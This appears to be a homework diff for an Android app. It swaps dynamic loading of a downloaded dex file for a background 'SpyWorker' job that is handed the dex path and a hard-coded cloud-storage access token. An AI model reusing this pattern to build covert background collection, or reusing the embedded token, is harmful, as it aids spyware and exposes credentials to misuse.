@@ -2,14 +2,15 @@ package com.homework.myapplication.presentation
 
 import android.Manifest
 import android.os.Bundle
-import android.util.Log
 import androidx.activity.viewModels
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.work.*
 import com.homework.myapplication.databinding.ActivityMainBinding
-import dalvik.system.DexClassLoader
+import com.homework.myapplication.presentation.SpyWorker.Companion.PATH_KEY
+import com.homework.myapplication.presentation.SpyWorker.Companion.TOKEN_KEY
 import java.io.InputStream
+import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
@@ -50,29 +51,36 @@ class MainActivity : AppCompatActivity() {
                 saveFile(viewState.inputStream)
             }
             is MainViewState.SuccessSaveFile -> {
-                loadDexFile(viewState.internalPath)
+                startWorkManager(viewState.internalPath)
             }
         }
     }
 
-    private fun loadDexFile(dexInternalStoragePath: String) {
-        val optimizedDexOutputPath = getDir("outdex", MODE_PRIVATE)
-        val loader = DexClassLoader(
-            dexInternalStoragePath,
-            optimizedDexOutputPath.absolutePath,
-            null,
-            javaClass.classLoader
-        )
-        val startWorkerLoader = loader.loadClass(CLASS_NAME)
-        try {
-            val startWorker = startWorkerLoader.newInstance()
-            if (startWorker is StartWorker) {
-                startWorker.startWorker(baseContext)
-            }
-        } catch (e: Exception) {
-            e.printStackTrace()
-            Log.d("dex", "in exception")
-        }
+    private fun startWorkManager(dexInternalStoragePath: String) {
+        val dexInternalPath = Data.Builder().apply {
+            putString(PATH_KEY, dexInternalStoragePath)
+            putString(TOKEN_KEY, ACCESS_TOKEN)
+        }.build()
+        val constraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
+        val workRequest = OneTimeWorkRequestBuilder<SpyWorker>()
+            .setInputData(dexInternalPath)
+            .setBackoffCriteria(
+                BackoffPolicy.LINEAR, // The BackoffPolicy to use when increasing backoff time
+                OneTimeWorkRequest.MIN_BACKOFF_MILLIS, // Time to wait before retrying the work in timeUnit units
+                TimeUnit.MILLISECONDS
+            ) // The TimeUnit for backoffDelay
+            .addTag("SingleSimpleWorkerTag")
+            .setConstraints(constraints)
+            .build()
+
+        WorkManager.getInstance(this)
+            .enqueueUniqueWork(
+                "SingleSimpleWorker", // A unique name which for this operation
+                ExistingWorkPolicy.REPLACE, // An ExistingWorkPolicy
+                workRequest
+            )
     }
 
     private fun saveFile(inputStream: InputStream) {
@@ -91,8 +99,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     companion object {
-        const val DEX_FILENAME = "classes.dex"
-        const val CLASS_NAME = "com.homework.myapplication.presentation.StartWorkerImpl"
+        const val DEX_FILENAME = "classes9.dex"
         const val REQUEST_PHONE_CALL = 1
+        private const val ACCESS_TOKEN =
+            "sl.BBlLSQg1bj--2QOYgahnl-JArKvXalckaX06OM5LXdooXCQeXPDpGjloMosFZc2DpnYyI0mIa9_xRHLornKDUH82TQpor-e-E7ADVbPrwAWVv_iga5rgN2NrQoKcW_iDFYK1xx4rYa4E"
     }
 }
